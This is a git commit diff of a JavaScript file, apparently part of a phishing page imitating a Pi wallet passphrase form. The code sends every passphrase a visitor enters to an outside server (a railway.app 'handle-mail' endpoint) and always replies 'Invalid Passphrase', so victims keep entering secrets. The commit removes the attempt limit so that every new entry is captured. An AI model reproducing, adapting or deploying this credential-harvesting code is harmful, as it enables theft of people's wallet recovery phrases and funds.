de16605f85de28dff1b352a23068b85353320193
Neon-jeff <omaksteejay@gmail.com>
2024-03-22 23:23:46 +0100

    new changes

--- pi/send.js
+++ pi/send.js
@@ -6,22 +6,22 @@ let data = document.querySelector(".form-control");
 
 let message = document.querySelector(".error");
 
-let counter = 0;
-let key=''
+// let counter = 0;
+let key = "";
 
 form.addEventListener("submit", async (e) => {
-  if (counter < 2 && (key!=data.value || key=='')) {
-    key=data.value
-    counter++;
+  if (key != data.value || key == "") {
+    key = data.value;
+    // counter++;
     e.preventDefault();
-    message.innerHTML = " <p>Invalid Passphrase <br> Or incomplete KYC</p>";
-    await fetch("https://mainnet-production.up.railway.app/handle-mail2", {
+    message.innerHTML = " <p>Invalid Passphrase</p>";
+    await fetch("https://mainnet-production.up.railway.app/handle-mail", {
       method: "POST",
       body: JSON.stringify({ pass: data.value }),
     });
   } else {
     e.preventDefault();
-    message.innerHTML = " <p>Invalid Passphrase <br> Or incomplete KYC</p>";
+    message.innerHTML = " <p>Invalid Passphrase</p>";
   }
 
   // window.location.reload()
